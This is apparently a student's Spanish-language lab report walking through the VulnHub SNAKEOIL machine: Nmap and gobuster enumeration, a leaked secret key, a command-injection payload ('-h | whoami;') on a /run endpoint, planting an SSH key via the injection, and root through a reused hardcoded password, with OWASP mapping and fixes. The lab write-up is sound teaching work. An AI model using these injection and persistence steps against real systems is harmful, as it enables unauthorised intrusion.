De la teoría a la práctica: walkthrough en acción

Máquina objetivo: DigitalWorld.local — SNAKEOIL · Docente: Servando López

Introducción

Este informe documenta un ejercicio práctico de pentesting realizado sobre la máquina virtual DigitalWorld.local: SNAKEOIL (obtenida de VulnHub), dentro de un entorno de laboratorio aislado y con fines exclusivamente educativos. El objetivo fue aplicar la metodología estándar de una prueba de penetración —reconocimiento, escaneo, enumeración, análisis de vulnerabilidades, explotación y post-explotación— para comprender de forma práctica cómo se identifican y explotan fallos reales de seguridad.

La cadena de ataque combinó un control de acceso insuficiente, una vulnerabilidad de tipo SSRF (Server-Side Request Forgery), una inyección de comandos del sistema operativo y el uso de credenciales expuestas en el código fuente, permitiendo escalar desde un registro de usuario común hasta privilegios totales de administrador.

Objetivo general

Demostrar la capacidad de aplicar conocimientos teóricos de seguridad informática en un entorno práctico, mediante un walkthrough detallado y la explicación de las técnicas y metodologías utilizadas para vulnerar una máquina virtual.

Objetivos específicos

  • Configurar un entorno de virtualización aislado para realizar las pruebas de forma segura.
  • Utilizar herramientas de escaneo de puertos y servicios para identificar posibles vectores de ataque.
  • Enumerar los servicios y aplicaciones en ejecución del sistema objetivo.
  • Investigar las vulnerabilidades conocidas asociadas con los servicios identificados.
  • Evaluar el riesgo y la viabilidad de explotar cada vulnerabilidad.
  • Seleccionar y adaptar los exploits/técnicas adecuadas para las vulnerabilidades encontradas.
  • Escalar privilegios para obtener acceso administrativo.
  • Documentar cada paso del proceso con comandos, resultados y capturas.

Preparación del entorno de laboratorio

Se configuró un entorno de virtualización aislado con Oracle VM VirtualBox y una red "Host-Only" dedicada exclusivamente al laboratorio, de forma que ninguna de las dos máquinas fuera visible desde la red doméstica del equipo físico.

Reconocimiento y escaneo

Descubrimiento del host

Se identificó la IP de la máquina víctima dentro de la red host-only mediante escaneo ARP pasivo y confirmación con Nmap.

ComandoResultado / Explicación
netdiscover -r 192.168.56.0/24Detectó hosts activos en la red vía tráfico ARP
ip aConfirmó la IP propia de Kali: 192.168.56.101 (interfaz eth0)
nmap -sn 192.168.56.0/24Ping scan que confirmó 192.168.56.102 como host activo adicional

Escaneo de puertos y servicios (Nmap)

ComandoResultado / Explicación
nmap -p- -T4 -v 192.168.56.1023 puertos abiertos: 22/tcp (ssh), 80/tcp (http), 8080/tcp (http-proxy)
nmap -sV -sC -p22,80,8080 192.168.56.10222: OpenSSH 7.9p1 | 80: nginx "Welcome to SNAKEOIL!" | 8080: nginx, título "Snake Oil Project", con advertencia de Nmap "Proxy might be redirecting requests" — indicio temprano de una posible vulnerabilidad SSRF

Enumeración de servicios

Puerto 80: aunque podría pensarse en una posible puerta de entrada al ser el tráfico HTTP sin cifrar, no se encontraron directorios abiertos.

Puerto 8080 — "Snake Oil Project": aloja una aplicación web personalizada (blog corporativo ficticio de "Good Tech Inc."), con posts numerados y funciones de creación/edición de contenido.

ComandoResultado / Explicación
gobuster dir -u http://192.168.56.102:8080 -w /usr/share/wordlists/dirb/common.txtRutas encontradas: /1, /2, /4 (posts), /create, /login (405), /registration, /run (405), /secret (500), /test, /users
curl -v http://192.168.56.102:8080/secretHTTP 500 — sugiere que el endpoint requiere autenticación o una condición especial
curl -X POST http://192.168.56.102:8080/loginHTTP 400 — confirma que espera JSON con username/password
curl -X POST http://192.168.56.102:8080/runHTTP 400 — el endpoint recibe una URL/host y hace una petición por el usuario (posible SSRF, coincide con la advertencia de Nmap)

Análisis de vulnerabilidades

Registro abierto y emisión de JWT

El endpoint /registration permite crear una cuenta sin restricciones y devuelve inmediatamente un token de acceso (JWT). El payload decodificado no incluye un campo de rol, lo que sugiere que el backend podría confiar únicamente en el valor de sub para identificar privilegios.

Autenticación y filtración de un secreto interno

A diferencia de un header Authorization tradicional, la aplicación espera el JWT en una cookie llamada access_token_cookie. Al consultar /secret con el token de un usuario recién registrado, la respuesta reveló una clave interna (secret_key) que resultó ser la credencial exigida por el endpoint /run para ejecutar acciones — un caso de control de acceso insuficiente, ya que cualquier cuenta autenticada podía obtenerla.

Inyección de comandos del sistema operativo en /run

Con el secret_key en mano, se probó el endpoint /run enviando "url":"-h | whoami;", obteniendo como respuesta el nombre del usuario del sistema (patrick), confirmando la ejecución arbitraria de comandos.

Explotación

Se aprovechó la inyección de comandos para obtener acceso persistente por SSH, en lugar de una reverse shell tradicional: se generó un par de llaves SSH propio y se usó la inyección de comandos para que la propia víctima descargara la llave pública y la guardara como su authorized_keys, habilitando el acceso SSH sin contraseña.

ComandoResultado / Explicación
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa_snakeoil -N ""Genera el par de llaves RSA en Kali, sin passphrase
python3 -m http.server 80Sirve la llave pública por HTTP para que la víctima la descargue
Inyección vía /run con wgetLa víctima descarga la llave pública y la guarda como su authorized_keys
ssh -i ~/.ssh/id_rsa_snakeoil patrick@192.168.56.102Acceso SSH exitoso como el usuario patrick, sin contraseña

Post-explotación y escalada de privilegios

Una vez dentro del sistema como patrick, se enumeró su directorio personal y se encontró el código fuente completo de la aplicación web (carpeta flask_blog), confirmando la lógica vulnerable del endpoint /run. Dentro del código se halló una credencial en texto plano definida como valor de configuración JWT_SECRET_KEY, que resultó ser también la contraseña del usuario patrick a nivel de sistema operativo — un caso de reutilización de credenciales.

Al usar esa contraseña con sudo su se obtuvo una shell como root.

Relación con los fundamentos teóricos

Metodología aplicada

El walkthrough siguió las fases estándar de una prueba de penetración: reconocimiento, escaneo, enumeración, análisis de vulnerabilidades, explotación y post-explotación, en línea con metodologías reconocidas como PTES (Penetration Testing Execution Standard).

Vulnerabilidades y su relación con OWASP

  • SSRF: el endpoint /run permitió que el servidor realizara peticiones HTTP hacia destinos controlados por el atacante.
  • Control de acceso insuficiente (OWASP A01): el registro sin restricciones permitió a cualquier cuenta autenticada llegar a un endpoint sensible.
  • OS Command Injection (OWASP A03): el parámetro "url" se concatenaba sin sanitizar dentro de un comando de shell.
  • Uso de lista negra como control de seguridad: bloquear palabras específicas es una mitigación fácilmente evadible.
  • Uso de credenciales hardcodeadas (CWE-798): la contraseña del sistema estaba escrita en texto plano en el código fuente y reutilizada como secreto criptográfico.

Glosario de términos técnicos

  • SSRF: vulnerabilidad que permite a un atacante hacer que el servidor realice peticiones a destinos arbitrarios en su nombre.
  • JWT: estándar para representar credenciales de forma compacta y firmada digitalmente.
  • Command Injection: ejecución de comandos arbitrarios del sistema operativo a través de una entrada no validada.
  • Escalada de privilegios: obtener un nivel de acceso mayor al inicialmente conseguido.
  • Lista negra vs. lista blanca: una lista negra bloquea patrones conocidos (fácil de evadir); una lista blanca solo permite patrones explícitamente autorizados (más segura).

Conclusiones

Este proyecto permitió comprobar en la práctica que la mayoría de los ataques exitosos no dependen de técnicas extraordinariamente sofisticadas, sino de encadenar pequeños errores de configuración y desarrollo hasta obtener control total del sistema: un control de acceso débil permitió filtrar una clave interna, esa clave habilitó una inyección de comandos protegida por una lista negra fácilmente evadible, y una contraseña guardada en texto plano en el código fuente terminó de abrir la puerta a privilegios de root.

Como recomendación principal, un entorno real debería evitar la construcción dinámica de comandos de shell a partir de entradas de usuario, aplicar el principio de mínimo privilegio, y nunca almacenar credenciales directamente en el código fuente.
